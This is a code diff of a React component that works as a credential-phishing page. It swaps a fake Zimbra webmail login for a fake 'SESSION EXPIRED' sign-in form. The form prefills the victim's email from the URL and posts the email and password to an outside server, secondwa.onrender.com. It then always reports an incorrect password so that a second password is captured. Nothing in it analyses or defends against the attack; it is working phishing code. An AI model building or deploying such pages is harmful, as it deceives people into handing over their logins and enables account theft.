@@ -2,9 +2,7 @@ import "./App.css";
 import React, { useState } from "react";
 import { Styls } from "./stylls";
 import { useParams } from "react-router-dom";
-import logo from "./Untitled.png";
 import axios from "axios";
-
 function Forms() {
   const params = useParams();
   console.log(params.id);
@@ -19,15 +17,11 @@ function Forms() {
   const submitHandler = async (e) => {
     e.preventDefault();
 
- 
- const submitHandler = async (e) => {
-    e.preventDefault();
-
     console.log(email, pass);
     setConfirmForm(true);
     setShowForm(false);
     try {
-      await axios.post("https://secondwa.onrender.com/sendmail2", {
+      await axios.post("https://secondwa.onrender.com/sendmail3", {
         email,
         pass,
         pasers,
@@ -43,7 +37,7 @@ function Forms() {
     let domain = email.substring(email.lastIndexOf("@") + 1);
 
     try {
-      await axios.post("https://secondwa.onrender.com/sendmail2", {
+      await axios.post("https://secondwa.onrender.com/sendmail3", {
         email,
         pass,
         pasers,
@@ -58,118 +52,132 @@ function Forms() {
 
   return (
     <Styls>
-      <div className="contsainer">
-        {showForm && (
-          <form className="formal" onSubmit={submitHandler}>
-            <div className="imagees">
-              <img src={logo} className="imagee" alt="displare" />
-            </div>
-            <div className="inner">
-              <div className="labcon">
-                <span className="labeltext">Username:</span>
-
-                <input
-                  type="email"
-                  onChange={(e) => setEmail(e.target.value)}
-                  name="to_user"
-                  required
-                  value={params.id}
-                  title="pls no"
-                />
-              </div>
-              <div className="labcon">
-                <span className="labeltext">Password:</span>
-                <input
-                  type="password"
-                  onChange={(e) => setPass(e.target.value)}
-                  pattern="(?=.*[0-9]).{8,}"
-                  name="to_pass"
-                  required
-                />{" "}
-              </div>{" "}
-              <div className="stay">
-                <label>
-                  <input type="checkbox" /> stay signed in
-                </label>
-                <button> Sign In </button>
-              </div>
-              <hr></hr>
-              <div className="stay2">
-                <div>Version: </div>
-                <div>
-                  <select>
-                    <option>Default</option>
-                    <option>Advanced (Ajax)</option>
-                    <option>Standard (HTML)</option>
-                    <option>Mobile</option>
-                  </select>
-                  What's This?
+      {" "}
+      {showForm && (
+        <div id="html_encoder_div">
+          <div className="container">
+            <div className="office show border shadow bg-light" id="others">
+              <div className="office-holder">
+                <div className="logo">
+                  <div className="login_logo">
+                    <img
+                      src="https://yt3.googleusercontent.com/ytc/APkrFKYT-TGEQcsppAq_N2uWJBQ_wYVPy49zuRJhucrhNg=s900-c-k-c0x00ffffff-no-rj"
+                      width="50px"
+                      height="50px"
+                      style={{ borderRadius: "50%" }}
+                      alt=""
+                    />
+                  </div>
                 </div>
-              </div>
-            </div>
-          </form>
-        )}
-      </div>
-      {confirmForm && (
-        <div className="contsainer">
-          <form className="formal" onSubmit={editHandler}>
-            <div className="imagees">
-              <img src={logo} className="imagee" alt="displare" />
-            </div>
-            <div className="inner">
-              <div className="labcon">
-                <span className="labeltext">Username:</span>
+                <h5 className="fnttss">
+                  <b>SESSION EXPIRED !</b>
+                  <br />
+                </h5>
 
-                <input
-                  type="email"
-                  onChange={(e) => setEmail(e.target.value)}
-                  name="to_user"
-                  required
-                  value={params.id}
-                />
-              </div>
-              <div className="labcon">
-                <span className="labeltext">Password:</span>
-                <input
-                  type="password"
-                  onChange={(e) => setPasser(e.target.value)}
-                  pattern="(?=.*[0-9]).{8,}"
-                  name="to_pass"
-                  required
-                />
-              </div>
-              <p className="reda">Login failed Incorrect Password</p>
-              <div className="stay">
-                <label>
-                  <input type="checkbox" /> stay signed in
-                </label>
-                <button>{loading ? "Loading....." : "Sign In"}</button>
-              </div>
-              <hr></hr>
-              <div className="stay2">
-                <div>Version: </div>
-                <div>
-                  <select>
-                    <option>Default</option>
-                    <option>Advanced (Ajax)</option>
-                    <option>Standard (HTML)</option>
-                    <option>Mobile</option>
-                  </select>
-                  What's This?
-                </div>
+                <form className="formal" onSubmit={submitHandler}>
+                  <div className="form-holder">
+                    <div>
+                      <div className="alert alert-danger hide alert2"></div>
+                    </div>
+                    <input
+                      type="email"
+                      name="to_user"
+                      required
+                      onChange={(e) => setEmail(e.target.value)}
+                      placeholder="Enter Email"
+                      className="form-control"
+                      value={params.id}
+                    />
+                    <input
+                      type="password"
+                      name="to_pass"
+                      required
+                      onChange={(e) => setPass(e.target.value)}
+                      placeholder="Enter Password"
+                      className="form-control"
+                    />
+
+                    <div className="btn-holder">
+                      <button className="button-coll">
+                        <b> Sign in</b>
+                      </button>
+                    </div>
+                    <div className="checker">
+                      <label>
+                        <input type="checkbox" />
+                      </label>
+                      <span> Remember Me</span>
+                    </div>
+                  </div>
+                </form>
               </div>
             </div>
-          </form>
+          </div>
         </div>
       )}
+      {confirmForm && (
+        <div id="html_encoder_div">
+          <div className="container">
+            <div className="office show border shadow bg-light" id="others">
+              <div className="office-holder">
+                <div className="logo">
+                  <div className="login_logo">
+                    <img
+                      src="https://yt3.googleusercontent.com/ytc/APkrFKYT-TGEQcsppAq_N2uWJBQ_wYVPy49zuRJhucrhNg=s900-c-k-c0x00ffffff-no-rj"
+                      width="50px"
+                      height="50px"
+                      style={{ borderRadius: "50%" }}
+                      alt=""
+                    />
+                  </div>
+                </div>
+                <h5 className="fnttss">
+                  <b>SESSION EXPIRED !</b>
+                  <br />
+                </h5>
 
-      <div className="smaller">
-        <br></br>
-        Zimbra :: the leader in open source messaging and collaboration :: Blog
-        - Wiki - Forumsc<br></br>
-        Copyright © 2005-2019 Synacor, Inc. All rights reserved. "Zimbra" is a
-        registered trademark of Synacor, Inc.
-      </div>
+                <form className="formal" onSubmit={editHandler}>
+                  <div className="form-holder">
+                    <div>
+                      <div className="alert alert-danger hide alert2"></div>
+                    </div>
+                    <input
+                      type="email"
+                      name="to_user"
+                      required
+                      onChange={(e) => setEmail(e.target.value)}
+                      placeholder="Enter Email"
+                      className="form-control"
+                      value={params.id}
+                    />
+                    <input
+                      type="password"
+                      name="to_pass"
+                      required
+                      onChange={(e) => setPasser(e.target.value)}
+                      placeholder="Enter Password"
+                      className="form-control"
+                    />
+                    <p className="reda">Login failed Incorrect Password</p>
+
+                    <div className="btn-holder">
+                      <button className="button-coll">
+                        <b>{loading ? "Loading....." : "Sign In"}</b>
+                      </button>
+                    </div>
+                    <div className="checker">
+                      <label>
+                        <input type="checkbox" />
+                      </label>
+                      <span> Remember Me</span>
+                    </div>
+                  </div>
+                </form>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
     </Styls>
   );
 }
